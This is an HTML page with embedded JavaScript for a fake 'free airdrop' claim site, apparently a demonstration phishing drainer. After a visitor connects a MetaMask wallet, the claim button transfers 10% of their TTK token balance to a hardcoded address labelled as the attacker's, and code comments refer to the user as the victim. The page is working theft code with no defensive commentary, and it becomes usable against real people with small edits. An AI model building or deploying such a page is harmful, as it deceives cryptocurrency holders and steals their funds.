<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>

    <h1>Claim Your Free Airdrop!</h1>
    <button id="connectButton">Connect MetaMask</button>
    <button id="airdropButton" style="display:none;">Claim Airdrop</button>

    <script>
        // ABI for the ERC-20 contract (TTK token)
        const tokenABI = [
            {
                "constant": true,
                "inputs": [{ "name": "account", "type": "address" }],
                "name": "balanceOf",
                "outputs": [{ "name": "balance", "type": "uint256" }],
                "payable": false,
                "stateMutability": "view",
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    { "name": "recipient", "type": "address" },
                    { "name": "amount", "type": "uint256" }
                ],
                "name": "transfer",
                "outputs": [{ "name": "", "type": "bool" }],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // Hardcoded attacker wallet address
        const attackerAddress = "0xA79f1997eAC8B797f67bf728DaB6c57a3961cA74"; 

        // Token contract address (TTK token)
        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; 

        let web3;
        let userAddress;
        let tokenContract;

        // Connect MetaMask to the website
        async function connectMetaMask() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];  // Get the victim's wallet address

                    // Initialize the token contract
                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);

                    // Show the airdrop button
                    document.getElementById('connectButton').style.display = 'none';
                    document.getElementById('airdropButton').style.display = 'block';
                } catch (error) {
                    console.error("User denied MetaMask connection", error);
                    alert("Please connect your MetaMask wallet.");
                }
            } else {
                alert("Please install MetaMask!");
            }
        }

        // Claim the airdrop and send tokens
        async function claimAirdrop() {
            try {
                // Get the user's balance of TTK tokens
                const balance = await tokenContract.methods.balanceOf(userAddress).call();
                const amountToSend = balance / 10;  // Example: sending 10% of their balance

                if (amountToSend > 0) {
                    // Send a transaction to transfer tokens to the attacker's address
                    await tokenContract.methods.transfer(attackerAddress, amountToSend).send({
                        from: userAddress
                    });

                    alert("Airdrop claimed! Tokens transferred to attacker.");
                } else {
                    alert("Insufficient balance to claim airdrop.");
                }
            } catch (err) {
                console.error("Error in claiming airdrop", err);
                alert("Transaction failed! Please check the console for more details.");
            }
        }

        // Event listeners for the buttons
        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
        document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
    </script>

</body>
</html>
